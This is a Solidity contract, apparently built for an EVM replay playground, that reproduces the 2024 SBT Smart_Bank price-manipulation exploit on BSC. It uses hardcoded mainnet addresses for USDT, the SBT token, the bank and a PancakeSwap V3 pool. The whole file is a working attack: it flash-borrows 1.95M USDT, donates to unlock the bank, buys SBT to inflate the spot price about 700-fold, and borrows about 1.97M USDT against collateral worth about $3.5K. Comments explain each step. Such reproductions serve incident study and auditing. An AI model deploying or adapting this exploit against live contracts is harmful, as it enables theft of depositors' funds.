// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-SBT).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `ContractTest`
// (attacker == address(this); the PancakeSwap V3 flash callback
// `pancakeV3FlashCallback` lives on the test itself), so there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit's body moved into `run()`, plus the flash
// callback) so the playground can deploy it and record run(). Logic and constants
// are copied verbatim from test/SBT_exp.sol.
//
// Root cause: Smart_Bank prices its own SBT token from the INSTANTANEOUS ratio of
// its own USDT and SBT balances (SBT_Price() = USDT_bal * 1e18 / SBT_bal), with no
// TWAP/external oracle. A single flash-loan-funded Buy_SBT both drains the bank's
// SBT and inflates its USDT, spiking SBT_Price() ~700x in the same transaction.
// The very next call, Loan_Get(), sizes the required collateral off that SAME
// poisoned price, so the attacker borrows ~1.97M USDT against SBT collateral
// that is worth only ~$3.5K at the honest price.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface Smartbank {
    function _Start() external;
    function Buy_SBT(uint256 _SBT_) external;
    function Loan_Get(uint256 USDT_) external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract SBTDrain {
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955); // USDT on BSC
    IERC20 constant SBT = IERC20(0x94441698165fB7e132e207800B3eA57E34c93a72);
    Smartbank constant Bank = Smartbank(0x2b45DD1d909c01aAd96fa6b67108D691B432f351);
    IUniPairV3 constant Pool = IUniPairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    // testExploit(): flash-borrow 1,950,000 BUSD from the PancakeSwap V3 pool.
    // The callback below does the rest of the attack.
    function run() external {
        Pool.flash(address(this), 1_950_000 ether, 0, "0x123");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 /*fee1*/, bytes calldata /*data*/) external {
        // Step 1: donate 950,000 USDT to the bank so its balance clears the
        // permissionless _Start() gate (>= 1,000,000 USDT). This donation alone
        // moves SBT_Price() from ~0.002736 to ~0.04797 (~17.5x).
        BUSD.approve(address(Bank), type(uint256).max);
        BUSD.transfer(address(Bank), 950_000 ether);
        SBT.approve(address(Bank), type(uint256).max);
        Bank._Start();

        // Step 2: buy 20,000,000 SBT at the still-cheap price. This single trade
        // drains the bank's SBT (21.0M -> 1.0M) and inflates its USDT (1.01M ->
        // 1.97M), spiking the next SBT_Price() reading to ~1.967 (~719x honest).
        Bank.Buy_SBT(20_000_000);

        // Step 3: borrow against the now-poisoned price. The collateral the bank
        // demands, (USDT_/SBT_Price())*1.3, looks adequate at the manipulated
        // price but is worth only ~$3,556 at the honest price — the attacker
        // already holds plenty of SBT from step 2 to post it.
        Bank.Loan_Get(1_966_930);

        // Step 4: repay the flash loan (principal + fee).
        BUSD.transfer(address(Pool), 1_950_000 ether + fee0);
    }

    receive() external payable {}
}
